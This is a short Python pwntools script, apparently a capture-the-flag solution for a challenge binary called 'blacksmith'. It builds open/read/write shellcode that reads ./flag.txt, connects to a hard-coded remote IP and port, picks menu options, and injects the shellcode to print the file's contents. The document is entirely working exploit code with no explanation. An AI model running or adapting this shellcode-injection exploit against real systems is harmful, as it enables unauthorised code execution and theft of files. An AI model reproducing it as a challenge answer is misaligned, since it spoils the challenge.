from pwn import *

address = '94.237.52.225'
port = 47738

context.log_level = 'critical'
context.arch = 'amd64'
context.binary = binary = ELF('./blacksmith')

shellcode = shellcraft.open('./flag.txt')
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)
shellcode += shellcraft.exit(0)
shellcode = asm(shellcode)

with remote(address, port) as target:
	target.sendlineafter(b'> ', b'1')
	target.sendlineafter(b'> ', b'2')
	target.sendlineafter(b'> ', shellcode)
	print(target.recvline().strip().decode())
